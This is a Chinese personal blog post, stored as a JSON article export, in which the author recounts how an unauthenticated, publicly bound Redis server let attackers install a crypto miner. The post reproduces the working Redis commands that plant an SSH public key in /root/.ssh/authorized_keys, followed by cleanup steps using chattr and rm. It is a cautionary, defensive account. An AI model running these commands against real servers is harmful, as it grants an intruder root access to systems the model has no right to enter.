{"title":"Redis挖矿分析","uid":"ac22266bae0c79a0958a1796275c31c3","slug":"Redis/为什么当你学习Redis，发现自己的服务器在挖矿了","date":"2022-11-25T05:03:04.000Z","updated":"2022-11-25T06:47:42.938Z","comments":true,"path":"api/articles/Redis/为什么当你学习Redis，发现自己的服务器在挖矿了.json","keywords":null,"cover":"/img/default_top_img.jpg","content":"<h1 id=\"为什么当你学习Redis，发现自己的服务器在挖矿了\"><a href=\"#为什么当你学习Redis，发现自己的服务器在挖矿了\" class=\"headerlink\" title=\"为什么当你学习Redis，发现自己的服务器在挖矿了\"></a>为什么当你学习Redis，发现自己的服务器在挖矿了</h1><p>​    在我学习Redis时，因为嫌麻烦就没有设置密码，结果导致一段时间后系统提醒我，我的服务器上有挖矿行为，如果不清理就停止运行，我一脸懵逼，并不断上网查找哪里出现问题了，但最终还是没有解决，无奈下我初始化了服务器。希望本篇文章能对你有锁帮助，顺利让你体会到入侵自己服务器的感觉。</p>\n<h2 id=\"你是如何连接服务器的？\"><a href=\"#你是如何连接服务器的？\" class=\"headerlink\" title=\"你是如何连接服务器的？\"></a>你是如何连接服务器的？</h2><p>​    在最初我们购买好自己的服务器后，要么在服务器厂商页面进行安全连接，要么通过<code>SSH 用户名@密码</code>方式进行连接，例如下图：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008vxvgGly1h78eo827x4j30to08tdgt.jpg\" alt=\"image-20221017171909179\"></p>\n<p>​    但到后面我们发现每次都需要输入密码，也太麻烦了，可以利用秘钥登陆服务器。那如何获取到你的秘钥呢？</p>\n<ol>\n<li><p>客户端通过命令行模式输入：<code>ssh-keygen</code>生成自己的公钥和私钥（这里可以指定参数，具体自己查）。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008vxvgGly1h78evcmqqrj30tp06ht9x.jpg\" alt=\"image-20221017172559852\"></p>\n</li>\n<li><p>手动将客户端的公钥放入远程<a href=\"https://cloud.tencent.com/product/cvm?from=10680\">服务器</a>的指定位置,/root/.ssh/authorized_keys。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008vxvgGly1h78f016nb3j30ec04wmxd.jpg\" alt=\"image-20221017173030351\"></p>\n</li>\n<li><p>现在我们再通过ssh进行登陆，可以看到直接登陆到服务器了</p>\n</li>\n</ol>\n<p><img src=\"https://tva1.sinaimg.cn/large/008vxvgGly1h78f21boi2j30p606l74x.jpg\" alt=\"image-20221017173225460\"></p>\n<p>那说了这么多，我们发现只要服务器上有你的秘钥，你就可以直接进行登陆，不需要设置密码。那这和Redis有啥关系呢？</p>\n<h2 id=\"你是如何连接Redis的？\"><a href=\"#你是如何连接Redis的？\" class=\"headerlink\" title=\"你是如何连接Redis的？\"></a>你是如何连接Redis的？</h2><p>通常有三种：</p>\n<ol>\n<li>在服务器中使用<code>redis-cli</code>进行操作</li>\n<li>在代码中连接使用</li>\n<li>在本地远程连接使用：<code>redis-cli -h IP地址</code></li>\n</ol>\n<p>而我们最长使用的就是使用代码进行连接，因此需要修改Redis的配置文件。来运行我们远程访问。修改一下参数：</p>\n<ol>\n<li><code>protected-mode no</code></li>\n<li><code>bind 0.0.0.0</code></li>\n</ol>\n<p>​    如果你忘了设置密码了，当Redis重新加载配置文件后，理论上你能访问到的同时，别人只要知道你的IP地址，也就能操作你的Redis了，下图显示本地可以直接访问，并进行操作了。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008vxvgGly1h78fufgzrxj30oz065mxb.jpg\" alt=\"image-20221017175943082\"></p>\n<p>​    接下来我们对Redis存储一些值，输入：<code>cat 你的公钥本地地址 | redis-cli -h 服务器IP地址 -x set crackit</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008vxvgGly1h78fzfmrdlj311t0990tq.jpg\" alt=\"image-20221017180431887\"></p>\n<p>​    通过上面的指令，我们已经成功的将公钥值放入Redis中了，并可以查询到。</p>\n<blockquote>\n<p>192.168.1.11:6379&gt; config set dir /root/.ssh/    配置地址设置</p>\n<p>OK </p>\n<p>192.168.1.11:6379&gt; config get dir </p>\n<ol>\n<li>“dir” 2) “/root/.ssh” </li>\n</ol>\n<p>192.168.1.11:6379&gt; config set dbfilename “authorized_keys”</p>\n<p>OK</p>\n<p>192.168.1.11:6379&gt; save </p>\n<p>OK</p>\n</blockquote>\n<p>​    上面相当于把你redis中存储的值直接保存到了<code>/root/.ssh/authorized_keys </code>这个文件里,这不就是我们远程连接设置秘钥的地方嘛，我草！！！，所以这时候你的服务器已经可以让别人进出无阻了，想干嘛干嘛了。关键这不是最恶心人的。当服务器厂商对你提醒后，你去检查你的秘钥，发现真的多出来一个，你想删却发现没有权限。如果运气好你可以在定时任务中找到莫名奇妙的任务，你删掉，但并没什么用，相当于你家大门已经没有了，你疯狂的上网搜索，发现可以用<code>chattr</code>来修改文件权限，但惊奇的发现chatter这个指令不存在，是的，人家把你的大砍刀也直接顺走了。我们一步步来解决。</p>\n<ol>\n<li>首先我们需要chatter来修改文件属性，但是显示指令不存在<ol>\n<li>使用：<code>yum -y install e2fsprogs</code>,但是可能显示该包已经存在</li>\n<li>直接：<code>yum remove e2fsprogs</code>卸载之前的，然后从新下载。</li>\n</ol>\n</li>\n<li>这时候看chatter应该是可以用了<ol>\n<li>使用：<code>lsattr authorized_keys</code>，去检查该文件</li>\n<li><img src=\"https://tva1.sinaimg.cn/large/008vxvgGly1h78hbt51vxj30tk02haa7.jpg\" alt=\"image-20221017185101472\"></li>\n<li>如果是这种情况说明文件已经被锁定了，我们使用：<code>chattr -ia authorized_keys </code>也就是去掉这两个属性。</li>\n</ol>\n</li>\n<li>这时候该文件已经可以被chmod修改权限了，使用<code>chmod 777 authorized_keys</code></li>\n<li>如果上面都没问题，使用：<code>rm -f authorized_keys</code> 直接删除。</li>\n<li>最后检查定时任务之类的。</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>​    由于攻击是我亲身经历的，让我们烦恼了好一阵子，所以在这里写下来，希望能对你有所帮助。不要在服务器上尝试我上述的打开Redis权限的步骤，因为你大概率十分钟之内就被攻击了。别不信，我就是这么被攻击的。</p>\n","text":"为什么当你学习Redis，发现自己的服务器在挖矿了​ 在我学习Redis时，因为嫌麻烦就没有设置密码，结果导致一段时间后系统提醒我，我的服务器上有挖矿行为，如果不清理就停止运行，我一脸懵逼，并不断上网查找哪里出现问题了，但最终还是没有解决，无奈下我初始化了服务器。希望本篇文章能对...","link":"","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[{"name":"Redis","slug":"Redis","count":2,"path":"api/categories/Redis.json"}],"tags":[{"name":"网络攻击","slug":"网络攻击","count":1,"path":"api/tags/网络攻击.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BD%93%E4%BD%A0%E5%AD%A6%E4%B9%A0Redis%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%A8%E6%8C%96%E7%9F%BF%E4%BA%86\"><span class=\"toc-text\">为什么当你学习Redis，发现自己的服务器在挖矿了</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%A0%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%EF%BC%9F\"><span class=\"toc-text\">你是如何连接服务器的？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%A0%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5Redis%E7%9A%84%EF%BC%9F\"><span class=\"toc-text\">你是如何连接Redis的？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li></ol>","author":{"name":"秦思成","slug":"blog-author","avatar":"https://tva2.sinaimg.cn/large/9bd9b167ly1fzjxy660fij20b40b43yi.jpg","link":"/","description":"我的个人知识库","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"类加载机制","uid":"7749a2b5879f92c33b3cacbb2a610b9b","slug":"JVM/7_类加载机制","date":"2022-11-25T05:04:04.000Z","updated":"2022-12-02T07:43:54.390Z","comments":true,"path":"api/articles/JVM/7_类加载机制.json","keywords":null,"cover":"/img/default_top_img.jpg","text":"概述 虚拟机是如何加载Class文件的？ Class文件进入虚拟机后会有什么变化？ ​ 在Java中我们知道有编译期和运行期，其中编译期为我们写的java代码通过javac编译成一个一个的class文件，而运行期则为将class文件通过jvm加载到内存中，通过一些列操作变成可以j...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"JVM","slug":"JVM","count":4,"path":"api/categories/JVM.json"}],"tags":[{"name":"类加载","slug":"类加载","count":1,"path":"api/tags/类加载.json"}],"author":{"name":"秦思成","slug":"blog-author","avatar":"https://tva2.sinaimg.cn/large/9bd9b167ly1fzjxy660fij20b40b43yi.jpg","link":"/","description":"我的个人知识库","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"封装自己的SDK","uid":"fad787980031e756d8eadb6688777ddf","slug":"Spring/封装自己的SDK","date":"2022-11-25T05:03:04.000Z","updated":"2022-11-25T06:48:35.827Z","comments":true,"path":"api/articles/Spring/封装自己的SDK.json","keywords":null,"cover":"/img/default_top_img.jpg","text":"封装自己的SDK​ 我们在开发Spring项目时常常会引入各种xxx-spring-boot-starter的依赖包，然后在配置文件中填入必要的信息，就可以使用依赖提供好的容器。这里是在鱼皮新项目直播中学习到的，特此记录一下。可在未来封装自己的SDK进行封装与装逼。 SDK项目下...","link":"","photos":[],"count_time":{"symbolsCount":"3.2k","symbolsTime":"3 mins."},"categories":[{"name":"Spring","slug":"Spring","count":2,"path":"api/categories/Spring.json"}],"tags":[{"name":"SDK","slug":"SDK","count":1,"path":"api/tags/SDK.json"}],"author":{"name":"秦思成","slug":"blog-author","avatar":"https://tva2.sinaimg.cn/large/9bd9b167ly1fzjxy660fij20b40b43yi.jpg","link":"/","description":"我的个人知识库","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}